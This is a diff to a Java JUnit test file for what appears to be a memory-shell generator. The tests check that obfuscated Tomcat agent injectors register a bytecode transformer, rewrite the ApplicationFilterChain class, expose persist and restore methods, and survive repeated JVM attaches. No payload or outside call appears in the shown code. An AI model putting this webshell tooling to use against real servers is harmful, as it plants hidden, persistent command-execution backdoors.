@@ -11,8 +11,13 @@ import net.bytebuddy.jar.asm.Opcodes;
 import org.junit.jupiter.api.Test;
 import org.objectweb.asm.ClassReader;
 import org.objectweb.asm.ClassVisitor;
+import org.objectweb.asm.ClassWriter;
 import org.objectweb.asm.MethodVisitor;
 
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.Instrumentation;
+import java.lang.reflect.Proxy;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
@@ -78,6 +83,8 @@ class MemShellObfuscationScopeTest {
             assertFalse(persistenceMethods.contains("resolveDeploymentJar"), scope.name());
             assertTrue(persistenceMethods.contains("persist"), scope.name());
             assertTrue(persistenceMethods.contains("isPersistent"), scope.name());
+            assertTrue(persistenceMethods.contains("restore"), scope.name());
+            assertTrue(persistenceMethods.contains("isRestore"), scope.name());
             byte[] transformer = companions.get(AgentPersistence.Transformer.class.getName());
             assertNotNull(transformer, scope.name());
             assertTrue(methodNames(transformer).contains("transform"), scope.name());
@@ -125,6 +132,59 @@ class MemShellObfuscationScopeTest {
     }
 
     @Test
+    void obfuscatedAgentStartsAndTransformsTargetClass() throws Exception {
+        MemShellResult result = generate(Server.Tomcat, ShellType.AGENT_FILTER_CHAIN,
+                ObfuscationScope.ALL, false);
+
+        GeneratedClassLoader loader = new GeneratedClassLoader();
+        for (Map.Entry<String, byte[]> entry : result.getInjectorInnerClassBytes().entrySet()) {
+            loader.define(entry.getKey(), entry.getValue());
+        }
+        Class<?> injector = loader.define(result.getInjectorClassName(), result.getInjectorBytes());
+
+        ClassFileTransformer[] registered = new ClassFileTransformer[1];
+        Instrumentation instrumentation = instrumentation(registered);
+
+        injector.getMethod("premain", String.class, Instrumentation.class)
+                .invoke(null, null, instrumentation);
+
+        ClassFileTransformer transformer = registered[0];
+        assertNotNull(transformer, "the obfuscated injector must register its transformer");
+        String targetName = "org/apache/catalina/core/ApplicationFilterChain";
+        byte[] targetBytes = targetClass(targetName);
+
+        byte[] transformed = transformer.transform(loader, targetName, null, null, targetBytes);
+
+        assertNotNull(transformed);
+        assertFalse(Arrays.equals(targetBytes, transformed));
+        assertEquals(targetName, new ClassReader(transformed).getClassName());
+        assertTrue(methodSignatures(transformed).contains("doFilter(Ljava/lang/Object;)V"));
+    }
+
+    @Test
+    void laterAgentJarReusesCompanionsOfTheFirstAttach() throws Exception {
+        // 同一 JVM 多次 attach：system loader 已持有第一个 jar 的伴随类，后续 jar 的注入器
+        // 必须能链接到那批被独立混淆过的类。
+        MemShellResult first = generate(Server.Tomcat, ShellType.AGENT_FILTER_CHAIN,
+                ObfuscationScope.ALL, false, "test.FirstAttachInjector");
+        MemShellResult second = generate(Server.Tomcat, ShellType.CATALINA_AGENT_CONTEXT_VALVE,
+                ObfuscationScope.ALL, false, "test.SecondAttachInjector");
+
+        GeneratedClassLoader loader = new GeneratedClassLoader();
+        for (Map.Entry<String, byte[]> entry : first.getInjectorInnerClassBytes().entrySet()) {
+            loader.define(entry.getKey(), entry.getValue());
+        }
+        loader.define(first.getInjectorClassName(), first.getInjectorBytes());
+        Class<?> secondInjector = loader.define(second.getInjectorClassName(), second.getInjectorBytes());
+
+        ClassFileTransformer[] registered = new ClassFileTransformer[1];
+        secondInjector.getMethod("premain", String.class, Instrumentation.class)
+                .invoke(null, null, instrumentation(registered));
+
+        assertNotNull(registered[0], "the second agent jar must link against the reused companions");
+    }
+
+    @Test
     void allScopeAddsHelperAndResponseWrapper() {
         for (ObfuscationScope scope : new ObfuscationScope[]{
                 ObfuscationScope.MEMSHELL_INJECTOR, ObfuscationScope.INJECTOR}) {
@@ -145,6 +205,12 @@ class MemShellObfuscationScopeTest {
 
     private static MemShellResult generate(String server, String shellType,
                                            ObfuscationScope scope, boolean probe) {
+        return generate(server, shellType, scope, probe, "test.ScopeInjector");
+    }
+
+    private static MemShellResult generate(String server, String shellType,
+                                           ObfuscationScope scope, boolean probe,
+                                           String injectorClassName) {
         ShellConfig shellConfig = ShellConfig.builder()
                 .server(server)
                 .shellTool(ShellTool.Command)
@@ -155,13 +221,33 @@ class MemShellObfuscationScopeTest {
                 .probe(probe ? ProbeConfig.builder().build() : null)
                 .build();
         InjectorConfig injectorConfig = InjectorConfig.builder()
-                .injectorClassName("test.ScopeInjector")
+                .injectorClassName(injectorClassName)
                 .urlPattern(ShellType.RAW_WEBSOCKET.equals(shellType) ? "/raw-ws" : "/*")
                 .build();
         Map<String, String> params = new HashMap<>();
         params.put("shellClassName", "test.ScopeShell");
         params.put("paramName", "cmd");
         return new MemShellGenerator().generate(shellConfig, injectorConfig, params);
+    }
+
+    private static Instrumentation instrumentation(ClassFileTransformer[] registered) {
+        return (Instrumentation) Proxy.newProxyInstance(
+                MemShellObfuscationScopeTest.class.getClassLoader(),
+                new Class<?>[]{Instrumentation.class},
+                (proxy, method, args) -> {
+                    if ("addTransformer".equals(method.getName())
+                            && args != null && args[0] instanceof ClassFileTransformer) {
+                        registered[0] = (ClassFileTransformer) args[0];
+                        return null;
+                    }
+                    if ("getAllLoadedClasses".equals(method.getName())) {
+                        return new Class<?>[0];
+                    }
+                    if ("removeTransformer".equals(method.getName())) {
+                        return Boolean.TRUE;
+                    }
+                    return null;
+                });
     }
 
     private static final class GeneratedClassLoader extends ClassLoader {
@@ -186,6 +272,28 @@ class MemShellObfuscationScopeTest {
             }
         }
         fail("Missing ASM companion with superclass " + superClassSuffix);
+    }
+
+    private static byte[] targetClass(String internalName) {
+        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
+        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER, internalName, null,
+                "java/lang/Object", null);
+        writer.visitField(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "invoked", "Z", null, null).visitEnd();
+        MethodVisitor constructor = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
+        constructor.visitCode();
+        constructor.visitVarInsn(Opcodes.ALOAD, 0);
+        constructor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
+        constructor.visitInsn(Opcodes.RETURN);
+        constructor.visitMaxs(0, 0);
+        constructor.visitEnd();
+        MethodVisitor doFilter = writer.visitMethod(Opcodes.ACC_PUBLIC, "doFilter",
+                "(Ljava/lang/Object;)V", null, null);
+        doFilter.visitCode();
+        doFilter.visitInsn(Opcodes.RETURN);
+        doFilter.visitMaxs(0, 0);
+        doFilter.visitEnd();
+        writer.visitEnd();
+        return writer.toByteArray();
     }
 
     private static Set<String> methodSignatures(byte[] classBytes) {
